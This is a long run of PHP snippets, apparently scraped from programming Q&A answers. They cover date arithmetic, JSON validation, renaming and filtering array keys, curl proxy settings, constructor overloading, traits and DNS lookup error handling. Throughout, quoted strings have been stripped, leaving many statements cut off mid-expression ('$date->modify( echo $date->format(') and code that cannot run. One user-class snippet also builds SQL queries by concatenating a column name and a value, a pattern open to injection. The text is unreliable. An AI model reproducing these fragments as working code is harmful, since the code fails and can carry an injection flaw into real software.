function rand_code($len) { $min_lenght= 0; $max_lenght = 100; $bigL = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; $smallL = "abcdefghijklmnopqrstuvwxyz"; $number = "0123456789"; $bigB = str_shuffle($bigL); $smallS = str_shuffle($smallL); $numberS = str_shuffle($number); $subA = substr($bigB,0,5); $subB = substr($bigB,6,5); $subC = substr($bigB,10,5); $subD = substr($smallS,0,5); $subE = substr($smallS,6,5); $subF = substr($smallS,10,5); $subG = substr($numberS,0,5); $subH = substr($numberS,6,5); $subI = substr($numberS,10,5); $RandCode1 = str_shuffle($subA.$subD.$subB.$subF.$subC.$subE); $RandCode2 = str_shuffle($RandCode1); $RandCode = $RandCode1.$RandCode2; if ($len>$min_lenght && $len<$max_lenght) { $CodeEX = substr($RandCode,0,$len); } else { $CodeEX = $RandCode; } return $CodeEX; }
function crypto_rand_secure($min, $max) { $range = $max - $min; if ($range < 1) return $min; $log = ceil(log($range, 2)); $bytes = (int) ($log / 8) + 1; $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); return $min + $rnd%$range; } function getToken($length) { return bin2hex(openssl_random_pseudo_bytes($length) }
$a_date = "2009-11-23"; echo date("Y-m-t", strtotime($a_date));
$a_date = "2040-11-23"; echo date("Y-m-t", strtotime($a_date));
$date = new DateTime( $date->modify( echo $date->format(
$week_start = strtotime( $week_end = strtotime( $month_start = strtotime( $month_end = strtotime( $year_start = strtotime( $year_end = strtotime( echo date( echo date( echo date( echo date( echo date( echo date(
$lastDay = \DateTime::createFromFormat("Y-m-d", "2009-11-23")->format("Y-m-t");
$a_date = "2009-11-23"; $date = new DateTime($a_date); $date->modify( echo $date->format(
$date = Carbon::now(); $date->addMonth(); $date->day = 0; echo $date->toDateString();
$date = new \DateTime(); $nbrDay = $date->format( $lastDay = $date->format(
$a_date = "2009-11-23"; $date = new DateTime($a_date); $date->modify( echo $date->format(
/** * Last date of a month of a year * * @param[in] $date - Integer. Default = Current Month * * @return Last date of the month and year in yyyy-mm-dd format */ function last_day_of_the_month($date = { $month = date( $year = date( $result = strtotime("{$year}-{$month}-01"); $result = strtotime( return date( } $a_date = "2009-11-23"; echo last_day_of_the_month($a_date);
$date1 = $year. $d = date_create_from_format( $last_day = date_format($d,
public function get_number_of_days_in_month($month, $year) { $date = $year."-".$month."-1"; return date("t", strtotime($date)); }
echo date("t", strtotime( $date = "2014-07-24"; echo date("t", strtotime($date)); $date = "2014-07-24"; $dateArr=explode( echo cal_days_in_month(CAL_GREGORIAN, $dateArr[1], $dateArr[0]);
$days = date("t"); $days = cal_days_in_month(CAL_GREGORIAN, date( $days = date("j",mktime (date("H"),date("i"),date("s"),(date("n")+1),0,date("Y")));
echo "<br> ".date("Y-n-j",mktime (date("H"),date("i"),date("s"),(11+1),0,2009));
function first_last_day($string, $first_last, $format) { $result = strtotime($string); $year = date( $month = date( $result = strtotime("{$year}-{$month}-01"); if ($first_last == if ($format == if ($format == }
$dateStart= date("Y-m-d", mktime(0, 0, 0, 10, 1, 2016)); $dateEnd = date("Y-m-d", mktime(0, 0, 0, 11, 0, 2016));
Carbon::createFromDate(2009, 11, 23)->lastOfMonth()->day;
function lastDateOfMonth($Month, $Year=-1) { if ($Year < 0) $Year = 0+date("Y"); $aMonth = mktime(0, 0, 0, $Month, 1, $Year); $NumOfDay = 0+date("t", $aMonth); $LastDayOfMonth = mktime(0, 0, 0, $Month, $NumOfDay, $Year); return $LastDayOfMonth; } for($Month = 1; $Month <= 12; $Month++) echo date("Y-n-j", lastDateOfMonth($Month))."\n";
<?php $output = $file = "filename.txt"; if (is_writable($file)) { if (!$handle = fopen($file, echo "Cannot open file ($file)"; exit; } if (fwrite($handle, $output) === FALSE) { echo "Cannot write to file ($file)"; exit; } echo "Success, content ($output) wrote to file ($file)"; fclose($handle); } else { echo "The file $file is not writable"; } ?>
function isJson($string) { return ((is_string($string) && (is_object(json_decode($string)) || is_array(json_decode($string))))) ? true : false; }
function isJson($string) { json_decode($string); return (json_last_error() == JSON_ERROR_NONE); }
$result = json_decode($json); if (json_last_error() === JSON_ERROR_NONE) { } if (json_last_error() === 0) { }
function json_validate($string) { $result = json_decode($string); switch (json_last_error()) { case JSON_ERROR_NONE: $error = break; case JSON_ERROR_DEPTH: $error = break; case JSON_ERROR_STATE_MISMATCH: $error = break; case JSON_ERROR_CTRL_CHAR: $error = break; case JSON_ERROR_SYNTAX: $error = break; case JSON_ERROR_UTF8: $error = break; case JSON_ERROR_RECURSION: $error = break; case JSON_ERROR_INF_OR_NAN: $error = break; case JSON_ERROR_UNSUPPORTED_TYPE: $error = break; default: $error = break; } if ($error !== exit($error); } return $result; }
$json = $output = json_validate($json); print_r($output);
Array ( [0] => stdClass Object ( [user_id] => 13 [username] => stack ) [1] => stdClass Object ( [user_id] => 14 [username] => over ) )
$json = $output = json_validate($json); print_r($output);
$result = json_decode($json); if ($result === FALSE) { }
var my_JSON_object = !(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test( text.replace(/"(\\.|[^"\\])*"/g,
if (is_object(json_decode($MyJSONArray))) { ... do something ... }
function isJson($str) { $json = json_decode($str); return $json && $str != $json; }
var_dump(isJson( var_dump(isJson( var_dump(isJson( var_dump(isJson( var_dump(isJson( var_dump(isJson( var_dump(isJson( var_dump(isJson( var_dump(isJson(
function is_json($str){ return json_decode($str) != null; }
$json_array = json_decode( $raw_json , true ); if( $json_array == NULL ) die (
function is_valid_json( $raw_json ){ return ( json_decode( $raw_json , true ) == NULL ) ? false : true ; }
function is_json($string) { return !empty($string) && is_string($string) && is_array(json_decode($string, true)) && json_last_error() == 0; }
function has_json_data($string) { $array = json_decode($string, true); return !empty($string) && is_string($string) && is_array($array) && !empty($array) && json_last_error() == 0; }
function isJson($string) { $decoded = json_decode($string); if ( !is_object($decoded) && !is_array($decoded) ) { return false; } return (json_last_error() == JSON_ERROR_NONE); } if ( isJson($someJsonString) ) { echo "valid JSON"; } else { echo "not valid JSON"; }
$data = "ahad"; $r_data = json_decode($data); if($r_data){ }
$data = "1213145"; $r_data = json_decode($data); if($r_data){ }
$data = "ahad"; $r_data = json_decode($data); if(($r_data != $data) && $r_data) print "Json success"; else print "Json error";
$result = @json_decode($json,true); if (is_array($result)) { echo }else{ echo }
function is_json($str) { return is_array(json_decode($str,true)); }
function isJson($str) { $result = false; if (!preg_match("/^\d+$/", trim($str))) { json_decode($str); $result = (json_last_error() == JSON_ERROR_NONE); } return $result; }
/** * Wrapper for json_decode that throws when an error occurs. * * @param string $json JSON data to parse * @param bool $assoc When true, returned objects will be converted * into associative arrays. * @param int $depth User specified recursion depth. * @param int $options Bitmask of JSON decode options. * * @return mixed * @throws \InvalidArgumentException if the JSON cannot be decoded. * @link http: */ function json_decode($json, $assoc = false, $depth = 512, $options = 0) { $data = \json_decode($json, $assoc, $depth, $options); if (JSON_ERROR_NONE !== json_last_error()) { throw new \InvalidArgumentException( } return $data; } /** * Wrapper for JSON encoding that throws when an error occurs. * * @param mixed $value The value being encoded * @param int $options JSON encode option bitmask * @param int $depth Set the maximum depth. Must be greater than zero. * * @return string * @throws \InvalidArgumentException if the JSON cannot be encoded. * @link http: */ function json_encode($value, $options = 0, $depth = 512) { $json = \json_encode($value, $options, $depth); if (JSON_ERROR_NONE !== json_last_error()) { throw new \InvalidArgumentException( } return $json; }
$isJson = json_decode($myJSON); if ($isJson instanceof \stdClass || is_array($isJson)) { echo("it } else { echo("nope"); }
if (preg_match( $aJson = json_decode($string, true); if (!is_null($aJson)) { ... do stuff here ... } }
<?php $json = function isJson($string) { json_decode($string); if(json_last_error() == JSON_ERROR_NONE) { if(substr($string,0,1) == else if(substr($string,0,1) == else { return FALSE; } } } echo isJson($json); ?>
function isJson($string) { if (is_numeric($string) || !is_string($string) || !$string) { return false; } $cleaned_str = trim($string); if (!$cleaned_str || !in_array($cleaned_str[0], [ return false; } $str = json_decode($string); return (json_last_error() == JSON_ERROR_NONE) && $str && $str != $string; }
public function testIsJson() { $non_json_values = [ "12", 0, 1, 12, -1, null, 0.1, " true, false, [], ]; $json_values = [ ]; foreach ($non_json_values as $non_json_value) { $is_json = isJson($non_json_value); $this->assertFalse($is_json); } foreach ($json_values as $json_value) { $is_json = isJson($json_value); $this->assertTrue($is_json); } }
function custom_json_decode(&$contents=NULL, $normalize_contents=true, $force_array=true){ $decoded_contents=NULL; if(is_string($contents)){ $decoded_contents=json_decode($contents,$force_array); } if($normalize_contents===true){ if(is_string($decoded_contents)){ if($decoded_contents=== $contents=NULL; } elseif($decoded_contents=== $contents=false; } } elseif(!is_null($decoded_contents)){ $contents=$decoded_contents; } } else{ $contents=$decoded_contents; } return $contents; }
$none_json_str= $contents=custom_json_decode($none_json_str); custom_json_decode($none_json_str,false); $valid_json=false; if(!is_null($none_json_str)){ $valid_json=true; }
function try_json_decode( $json, & $success = null ){ if( !is_string( $json )){ $success = false; return $json; } $data = json_decode( $json ); $success = $data !== null || $json === preg_match( return $success ? $data : $json; }
$json_or_not = ...; $data = try_json_decode( $json_or_not, $success ); if( $success ) process_data( $data ); else what_the_hell_is_it( $data );
var_dump( try_json_decode( array(), $success ), $success ); var_dump( try_json_decode( 123, $success ), $success ); var_dump( try_json_decode( var_dump( try_json_decode( null, $success ), $success ); var_dump( try_json_decode( var_dump( try_json_decode( var_dump( try_json_decode( var_dump( try_json_decode( var_dump( try_json_decode(
function is_json($input) { $input = trim($input); if (substr($input,0,1)!= return false; return is_array(@json_decode($input, true)); }
function isValidJson($string) { json_decode($string); if(json_last_error() == JSON_ERROR_NONE) { if( $string[0] == "{" || $string[0] == "[" ) { $first = $string [0]; if( substr($string, -1) == "}" || substr($string, -1) == "]" ) { $last = substr($string, -1); if($first == "{" && $last == "}"){ return true; } if($first == "[" && $last == "]"){ return true; } return false; } return false; } return false; } return false; }
/** * If $value is a JSON encoded object or array it will be decoded * and returned. * If $value is not JSON format, then it will be returned unmodified. */ function get_data( $value ) { if ( ! is_string( $value ) ) { return $value; } if ( strlen( $value ) < 2 ) { return $value; } if ( $json_data = json_decode( $value ); if ( ! $json_data ) { return $value; } return $json_data; }
$input=trim($input); if ((substr($input, 0, 1) == $output = json_decode($input, 1); if (in_array(gettype($output),[ } }
$arr[$newkey] = $arr[$oldkey]; unset($arr[$oldkey]);
function change_key( $array, $old_key, $new_key ) { if( ! array_key_exists( $old_key, $array ) ) return $array; $keys = array_keys( $array ); $keys[ array_search( $old_key, $keys ) ] = $new_key; return array_combine( $keys, $array ); }
$newarr[$newkey] = $oldarr[$oldkey]; $oldarr=$newarr; unset($newarr);
function change_array_key( $array, $old_key, $new_key) { if(!is_array($array)){ print if(!array_key_exists($old_key, $array)){ return $array; } $key_pos = array_search($old_key, array_keys($array)); $arr_before = array_slice($array, 0, $key_pos); $arr_after = array_slice($array, $key_pos + 1); $arr_renamed = array($new_key => $array[$old_key]); return $arr_before + $arr_renamed + $arr_after; }
function changekeyname($array, $newkey, $oldkey) { foreach ($array as $key => $value) { if (is_array($value)) $array[$key] = changekeyname($value,$newkey,$oldkey); else { $array[$newkey] = $array[$oldkey]; } } unset($array[$oldkey]); return $array; }
$array = [ ]; $renameMap = [ ]; $array = array_combine(array_map(function($el) use ($renameMap) { return $renameMap[$el]; }, array_keys($array)), array_values($array));
function swapKeys( &$arr, $origKey, $newKey, &$pendingKeys ) { if( !isset( $arr[$newKey] ) ) { $arr[$newKey] = $arr[$origKey]; unset( $arr[$origKey] ); if( isset( $pendingKeys[$origKey] ) ) { swapKeys( $arr, $pendingKeys[$origKey], $origKey, $pendingKeys ); unset( $pendingKeys[$origKey] ); } } elseif( $newKey != $origKey ) { $pendingKeys[$newKey] = $origKey; } }
$myArray = array( $pendingKeys = array(); foreach( $myArray as $key => $myArrayValue ) { $timestamp = strtotime( $myArrayValue ); swapKeys( $myArray, $key, $timestamp, $pendingKeys ); }
/** * Helper function to rename array keys. */ function _rename_arr_key($oldkey, $newkey, array &$arr) { if (array_key_exists($oldkey, $arr)) { $arr[$newkey] = $arr[$oldkey]; unset($arr[$oldkey]); return TRUE; } else { return FALSE; } }
function keyRename(array $hash, array $replacements) { $new=array(); foreach($hash as $k=>$v) { if($ok=array_search($k,$replacements)) $k=$ok; $new[$k]=$v; } return $new; }
function keyRename(array $hash, array $replacements) { foreach($hash as $k=>$v) if($ok=array_search($k,$replacements)) { $hash[$ok]=$v; unset($hash[$k]); } return $hash; }
$i = 0; $keys_array=array("0"=>"one","1"=>"two"); $keys = array_keys($keys_array); for($i=0;$i<count($keys);$i++) { $keys_array[$keys_array[$i]]=$keys_array[$i]; unset($keys_array[$i]); } print_r($keys_array);
$a = [ $af = array_flip($a) $af[ $a = array_flip($af)
Array ( [canine] => dog [feline] => cat [porcine] => pig )
function renameKey($oldkey, $newkey, $array) { $val = $array[$oldkey]; $tmp_A = array_flip($array); $tmp_A[$val] = $newkey; return array_flip($tmp_A); }
/** * Rename keys of an array * @param array $array (asoc) * @param array $replacement_keys (indexed) * @return array */ function rename_keys($array, $replacement_keys) { return array_combine($replacement_keys, array_values($array)); }
$myarr = array("a" => 22, "b" => 144, "c" => 43); $newkeys = array("x","y","z"); print_r(rename_keys($myarr, $newkeys));
<?php $arr = [ ]; foreach($arr as $k=>$v) { $kk = is_numeric($k) ? $v : $k; $vv = is_numeric($k) ? null : $v; $arr2[$kk] = $vv; } print_r($arr2);
Array ( [foo] => [bar] => alfa [baz] => Array ( [a] => hello [b] => world ) )
function replace_array_key($data) { $mapping = [ ]; $data = json_encode($data); foreach ($mapping as $needed => $replace) { $data = str_replace( } return json_decode($data, true); }
function rename_array_key(array $array, $old_key, $new_key) { if (!array_key_exists($old_key, $array)) { return $array; } $new_array = []; foreach ($array as $key => $value) { $new_key = $old_key === $key ? $new_key : $key; $new_array[$new_key] = $value; } return $new_array; }
function mapToIDs($array, $id_field_name = { $result = []; array_walk($array, function(&$value, $key) use (&$result, $id_field_name) { $result[$value[$id_field_name]] = $value; } ); return $result; } $arr = [0 => [ print_r($arr); print_r(mapToIDs($arr));
Array( [0] => Array( [id] => one [fruit] => apple ) [1] => Array( [id] => two [fruit] => banana ) ) Array( [one] => Array( [id] => one [fruit] => apple ) [two] => Array( [id] => two [fruit] => banana ) )
$url = $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_PROXY, "http: curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); $output = curl_exec($ch); $curl_error = curl_error($ch); curl_close($ch); print_r($output); print_r($curl_error);
--socks5-hostname Use the specified SOCKS5 proxy (and let the proxy resolve the host name).
<?php $ch = curl_init( curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, "localhost:8118"); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); curl_exec($ch); curl_close($ch); ?>
curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
$dateTime = new DateTime( echo $dateTime->format( $date = new DateTime( echo $date->getTimestamp();
$date = date_create( echo date_format($date, $date = date_create( echo date_timestamp_get($date);
$date = DateTime::createFromFormat( echo $dateTime->format( $date = date_parse_from_format( echo date_format($date,
$formatter = new IntlDateFormatter( IntlDateFormatter::FULL, IntlDateFormatter::FULL, IntlDateFormatter::GREGORIAN, ); echo $formatter->parse(
$d = DateTime::createFromFormat( echo $d->getTimestamp();
$d = DateTime::createFromFormat( echo $d->getTimestamp();
$d = DateTime::createFromFormat( echo $d->getTimestamp();
list($day, $month, $year) = explode( echo mktime(0, 0, 0, $month, $day, $year);
<?php date_default_timezone_set( $date = date("d M Y H:i:s"); echo strtotime($date); ?>
$date="30/07/2010 13:24"; list($day, $month, $year, $hour, $minute) = split( $timestamp = mktime($hour, $minute, 0, $month, $day, $year); echo date("r", $timestamp);
$date = date_parse_from_format( $timestamp = mktime(0, 0, 0, $date[
$d = DateTime::createFromFormat( if ($d === false) { die("Woah, that date doesn } echo $d->format(
function date_to_stamp( $date, $slash_time = true, $timezone = $return = false; $_timezone = date_default_timezone_get(); date_default_timezone_set( $timezone ); if( preg_match( $expression, $date, $matches ) ) $return = date( "Y-m-d " . ( $slash_time ? date_default_timezone_set( $_timezone ); return $return; } echo date_to_stamp( echo date_to_stamp( echo date_to_stamp( echo date_to_stamp( echo date(
function dateToTimestamp($date, $format, $timezone= { $old_timezone=date_timezone_get(); date_default_timezone_set($timezone); $date=strptime($date,$format); $day_start=mktime(0,0,0,++$date[ $day_end=$day_start+(60*60*24); date_default_timezone_set($old_timezone); return array( } $timestamps=dateToTimestamp( $day_start=$timestamps[
function getthistime($type, $modify = null) { $now = new DateTime(null, new DateTimeZone( if($modify) { $now->modify($modify); } if(!isset($type) || $type == return $now->format( } if($type == return $now->format( } if($type == return $now->getTimestamp(); } } function timestampfromdate($date) { return DateTime::createFromFormat( } echo getthistime( timestampfromdate(getthistime( strtotime(getthistime(
function UTCToTimestamp($utc_datetime_str) { preg_match_all( $datetime_str = $matches_arr[1][0]." ".$matches_arr[2][0]; return strtotime($datetime_str); } $my_utc_datetime_str = $my_timestamp_str = UTCToTimestamp($my_utc_datetime_str);
$my_array = array("foo" => 1, "hello" => "world"); $allowed = array("foo", "bar");
$my_array = [ $allowed = [ $filtered = array_filter( $my_array, function ($key) use ($allowed) { return in_array($key, $allowed); }, ARRAY_FILTER_USE_KEY );
$my_array = [ $allowed = [ $filtered = array_filter( $my_array, function ($val, $key) use ($allowed) { return isset($allowed[$key]) && ( $allowed[$key] === true || $allowed[$key] === $val ); }, ARRAY_FILTER_USE_BOTH );
var_dump(array_intersect_key($my_array, array_flip($allowed))); array(1) { ["foo"]=> int(1) }
$a = array( 0 => "val 0", "one" => "val one", "two" => "val two", "three"=> "val three", "four" => "val four", "five" => "val five", "6" => "val 6" ); $f = array_filter(array_keys($a), function ($k){ return strlen($k)>=4; }); $b = array_intersect_key($a, array_flip($f)); print_r($b);
Array ( [three] => val three [four] => val four [five] => val five )
$my_array = array("foo" => 1, "hello" => "world"); $allowed = array("foo", "bar"); $result = array_flip(array_filter(array_flip($my_array), function ($key) use ($allowed) { return in_array($key, $allowed); })); var_dump($result);
$mArray=array( $mSearch= $allowed=array_filter( array_keys($mArray), function($key) use ($mSearch){ return stristr($key,$mSearch); }); $mResult=array_intersect_key($mArray,array_flip($allowed));
Array ( [foo] => bar [foo2] => bar2 [fooToo] => bar3 )
function array_preg_filter_keys($arr, $regexp) { $keys = array_keys($arr); $match = array_filter($keys, function($k) use($regexp) { return preg_match($regexp, $k) === 1; }); return array_intersect_key($arr, array_flip($match)); } $mArray = array( print_r(array_preg_filter_keys($mArray, "/^foo/i"));
$array = [ reset($array); $apples = array_filter($array, function($color) use ($&array) { $key = key($array); next($array); return key($array) === }
$apples = array_filter($array, function($color) use ($&array) { return each($array)[ }
$array = array( 1 => 2 => 3 => ); $disallowed = array(1,3); foreach($disallowed as $key){ unset($array[$key]); }
$result = array_filter($my_array, function ($k) use ($allowed) { return in_array($k, $allowed); }, ARRAY_FILTER_USE_KEY);
function filter_array_keys(array $array, $callback) { $matchedKeys = array_filter(array_keys($array), $callback); return array_intersect_key($array, array_flip($matchedKeys)); } $result = filter_array_keys($my_array, function ($k) use ($allowed) { return in_array($k, $allowed); });
function filter_array_keys(array $array, $keys) { if (is_callable($keys)) { $keys = array_filter(array_keys($array), $keys); } return array_intersect_key($array, array_flip($keys)); } $result = filter_array_keys($my_array, function ($k) use ($allowed) { return in_array($k, $allowed); }); $result = filter_array_keys($my_array, $allowed));
$result = []; foreach ($my_array as $key => $value) { if (in_array($key, $allowed)) { $result[$key] = $value; } }
$filtered = from($array) ->where(function ($v, $k) use ($allowed) { return in_array($k, $allowed); }) ->toArray();
function filter_array_keys($array,$filter_keys=array()){ $l=array(&$array); $c=1; for($r=0;$r<$c;$r++){ $keys = array_keys($l[$r]); for($z=0;$z<count($l[$r]);$z++){ $object = &$l[$r][$keys[$z]]; if(is_array($object)){ $i=0; $keys_on_array=array_keys($object); $object=array_filter($object,function($el) use(&$i,$keys_on_array,$filter_keys){ $key = $keys_on_array[$i]; $i++; if(in_array($key,$filter_keys) || is_int($key))return false; return true; }); } if(is_array($l[$r][$keys[$z]])){ $l[] = &$l[$r][$keys[$z]]; $c++; } } } return $l[0]; }
$array = array("a"=>1, "b"=>2, "c"=>3, "d"=>4, "e"=>5);
$get_key_res = array_filter($array,"get_key",ARRAY_FILTER_USE_KEY );
$get_both = array_filter($array,"get_both",ARRAY_FILTER_USE_BOTH );
function get_key($key) { if($key == { return true; } else { return false; } } function get_both($val,$key) { if($key == { return true; } else { return false; } }
Output of $get_key is :Array ( [a] => 1 ) Output of $get_both is :Array ( [a] => 1 )
function comparison($min) { return function($item) use ($min) { return strlen($item) >= $min; }; } $input = array( 0 => "val 0", "one" => "val one", "two" => "val two", "three"=> "val three", "four" => "val four", "five" => "val five", "6" => "val 6" );
function remove($arr, $data) { return array_filter($arr, function ($element) use ($data) { return $element != $data; }); }
class Student { protected $id; protected $name; public function __construct($id){ $this->id = $id; } public function __construct($row_from_database){ $this->id = $row_from_database->id; $this->name = $row_from_database->name; } }
<?php class Student { public function __construct() { } public static function withID( $id ) { $instance = new self(); $instance->loadByID( $id ); return $instance; } public static function withRow( array $row ) { $instance = new self(); $instance->fill( $row ); return $instance; } protected function loadByID( $id ) { $row = my_awesome_db_access_stuff( $id ); $this->fill( $row ); } protected function fill( array $row ) { } } ?>
<?php class Student { protected $firstName; protected $lastName; /** * Constructor */ public function __construct() { } /** * Static constructor / factory */ public static function create() { $instance = new self(); return $instance; } /** * FirstName setter - fluent style */ public function setFirstName( $firstName) { $this->firstName = $firstName; return $this; } /** * LastName setter - fluent style */ public function setLastName( $lastName) { $this->lastName = $lastName; return $this; } } $student= Student::create()->setFirstName("John")->setLastName("Doe"); var_dump($student); ?>
class Student { protected $id; protected $name; public function __construct($idOrRow){ if(is_int($idOrRow)) { $this->id = $idOrRow; } else if(is_array($idOrRow)) { $this->id = $idOrRow->id; $this->name = $idOrRow->name; } }
public function __construct() { $parameters = func_get_args(); ... } $o = new MyClass(
trait StudentTrait { protected $id; protected $name; final public function setId($id) { $this->id = $id; return $this; } final public function getId() { return $this->id; } final public function setName($name) { $this->name = $name; return $this; } final public function getName() { return $this->name; } } class Student1 { use StudentTrait; final public function __construct($id) { $this->setId($id); } } class Student2 { use StudentTrait; final public function __construct($id, $name) { $this->setId($id)->setName($name); } }
class StudentFactory { static public function getStudent($id, $name = null) { return is_null($name) ? new Student1($id) : new Student2($id, $name) } }
$student1 = StudentFactory::getStudent(1); $student2 = StudentFactory::getStudent(1, "yannis");
<?php class myClass { public function __construct() { $get_arguments = func_get_args(); $number_of_arguments = func_num_args(); if (method_exists($this, $method_name = call_user_func_array(array($this, $method_name), $get_arguments); } } public function __construct1($argument1) { echo } public function __construct2($argument1, $argument2) { echo } public function __construct3($argument1, $argument2, $argument3) { echo } } $object1 = new myClass( $object2 = new myClass( $object3 = new myClass(
public function __construct($param) { if(is_int($param)) { $this->id = $param; } elseif(is_object($param)) { } }
class Student { private $id; private $name; public function __construct($id, $row=array()) { $this->id = $id; foreach($row as $key => $value) $this->$key = $value; } }
class Student { public function __construct($row) { foreach($row as $key => $value) $this->$key = $value; } } class EmptyStudent extends Student { public function __construct($id) { parent::__construct(array( } }
public function __construct() { $arguments = func_get_args(); switch(sizeof(func_get_args())) { case 0: break; case 1: $this->do_something($arguments[0]); break; case 2: $this->do_something_else($arguments[0], $arguments[1]); break; } }
$myObj = MyClass::factory( $myObj = MyClass::factory(
class Person { private $name; private $email; public static function withName($name) { $person = new Person(); $person->name = $name; return $person; } public static function withEmail($email) { $person = new Person(); $person->email = $email; return $person; } }
$person1 = Person::withName( $person2 = Person::withEmail(
class MyClass{ protected $myVar1; protected $myVar2; public function __construct($obj = null){ if($obj){ foreach (((object)$obj) as $key => $value) { if(isset($value) && in_array($key, array_keys(get_object_vars($this)))){ $this->$key = $value; } } } } }
$sample_variable = new MyClass([ ]); print_r($sample_variable);
$sample_variable = new MyClass(); print_r($sample_variable);
public function __construct() { $this -> id = 0; } public static function Exists($id) { if (!$id) return false; $id = (int)$id; if ($id <= 0) return false; $mysqli = Mysql::Connect(); if (mysqli_num_rows(mysqli_query($mysqli, "SELECT id FROM users WHERE id = " . $id)) == 1) return true; return false; } public static function FromId($id) { $u = new self(); if (!$u -> FillFromColumn("id", $id)) return false; return $u; } public static function FromColumn($column, $value) { $u = new self(); if (!$u -> FillFromColumn($column, $value)) return false; return $u; } public static function FromArray($row = array()) { if (!is_array($row) || $row == array()) return false; $u = new self(); $u -> FillFromArray($row); return $u; } protected function FillFromColumn($column, $value) { $mysqli = Mysql::Connect(); $result = mysqli_query($mysqli, "SELECT * FROM users WHERE " . $column . " = $count = mysqli_num_rows($result); if ($count == 0) return false; $row = mysqli_fetch_assoc($result); $this -> FillFromArray($row); } protected function FillFromArray(array $row) { foreach($row as $i => $v) { if (isset($this -> $i)) { $this -> $i = $v; } } } public function ToArray() { $m = array(); foreach ($this as $i => $v) { $m[$i] = $v; } return $m; } public function Dump() { print_r("<PRE>"); print_r($this -> ToArray()); print_r("</PRE>"); }
class A { function __construct($argument) { $type = gettype($argument); if($type == { } $this->{ } function __construct_boolean($argument) { } function __construct_integer($argument) { } function __construct_double($argument) { } function __construct_string($argument) { } function __construct_array($argument) { } function __construct_object($argument) { } function __construct_resource($argument) { } }
class myClass { var $error ; function __construct ( $data, $mode ) { $this->error = false switch ( $mode ) { default : $this->error = true ; break ; } } function processId ( $data ) { } function processRow ( $data ) { } } $a = new myClass ( $data, $b = new myClass ( $data, $c = new myClass ( $data, if ( $a->error ) exit ( if ( $b->error ) exit ( if ( $c->error ) exit (
trait GenericConstructorOverloadTrait { /** * @var array Constructors metadata */ private static $constructorsCache; /** * Generic constructor * GenericConstructorOverloadTrait constructor. */ public function __construct() { $params = func_get_args(); $numParams = func_num_args(); $finish = false; if(!self::$constructorsCache){ $class = new \ReflectionClass($this); $constructors = array_filter($class->getMethods(), function (\ReflectionMethod $method) { return preg_match("/\_\_construct[0-9]+/",$method->getName()); }); self::$constructorsCache = $constructors; } else{ $constructors = self::$constructorsCache; } foreach($constructors as $constructor){ $reflectionParams = $constructor->getParameters(); if(count($reflectionParams) != $numParams){ continue; } $matched = true; for($i=0; $i< $numParams; $i++){ if($reflectionParams[$i]->hasType()){ $type = $reflectionParams[$i]->getType()->__toString(); } if( !( !$reflectionParams[$i]->hasType() || ($reflectionParams[$i]->hasType() && is_object($params[$i]) && $params[$i] instanceof $type) || ($reflectionParams[$i]->hasType() && $reflectionParams[$i]->getType()->__toString() == gettype($params[$i])) ) ) { $matched = false; break; } } if($matched){ call_user_func_array(array($this,$constructor->getName()), $params); $finish = true; break; } } unset($constructor); if(!$finish){ throw new \InvalidArgumentException("Cannot match construct by params"); } } }
class MultiConstructorClass{ use GenericConstructorOverloadTrait; private $param1; private $param2; private $param3; public function __construct1($param1, array $param2) { $this->param1 = $param1; $this->param2 = $param2; } public function __construct2($param1, array $param2, \DateTime $param3) { $this->__construct1($param1, $param2); $this->param3 = $param3; } /** * @return \DateTime */ public function getParam3() { return $this->param3; } /** * @return array */ public function getParam2() { return $this->param2; } /** * @return mixed */ public function getParam1() { return $this->param1; } }
function __construct() { $paramsNumber=func_num_args(); if($paramsNumber==0){ }else{ $this->overload( } }
public function doSomething() { $paramsNumber=func_num_args(); if($paramsNumber==0){ }else{ $this->overload( } }
public function overloadMethod($methodName,$params){ $paramsNumber=sizeof($params); $methodNameNumber =$methodName.$paramsNumber; if (method_exists($this,$methodNameNumber)) { call_user_func_array(array($this,$methodNameNumber),$params); } }
trait A { function calc($v) { return $v+1; } } class MyClass { use A; function calc($v) { $v++; return A::calc($v); } } print (new MyClass())->calc(2);
trait A { function calc($v) { return $v+1; } } class MyClass { use A { calc as traitcalc; } function calc($v) { $v++; return traitcalc($v); } }
trait A { function calc($v) { return $v+1; } } class MyClass { use A { calc as protected traitcalc; } function calc($v) { $v++; return $this->traitcalc($v); } }
trait A { function calc($v) { return $v+1; } } class MyClass { function calc($v) { return $v+2; } } class MyChildClass extends MyClass{ } class MyTraitChildClass extends MyClass{ use A; } print (new MyChildClass())->calc(2); print (new MyTraitChildClass())->calc(2);
trait A { function calc($v) { return parent::calc($v*3); } } print (new MyTraitChildClass())->calc(2);
trait A { function trait_calc($v) { return $v*3; } } class MyClass { function calc($v) { return $v+2; } } class MyTraitChildClass extends MyClass{ use A { A::trait_calc as calc; } } class MySecondTraitChildClass extends MyClass{ use A { A::trait_calc as calc; } public function calc($v) { return $this->trait_calc($v)+.5; } } print (new MyTraitChildClass())->calc(2); echo "\n"; print (new MySecondTraitChildClass())->calc(2);
trait A { function calc($v) { return $v+1; } } class IntClass { use A; } class MyClass extends IntClass { function calc($v) { $v++; return parent::calc($v); } }
trait ATrait { function calc($v) { return $v+1; } } class A { use ATrait; } trait BTrait { function calc($v) { $v++; return parent::calc($v); } } class B extends A { use BTrait; } print (new B())->calc(2);
array dns_get_record ( string $hostname [, int $type= DNS_ANY [, array &$authns [, array &$addtl ]]] )
set_error_handler(function() { }); dns_get_record(); restore_error_handler();
set_error_handler([$logger, dns_get_record(); restore_error_handler();
set_error_handler(function($errno, $errstr, $errfile, $errline, array $errcontext) { if (0 === error_reporting()) { return false; } throw new ErrorException($errstr, 0, $errno, $errfile, $errline); }); try { dns_get_record(); } catch (ErrorException $e) { }
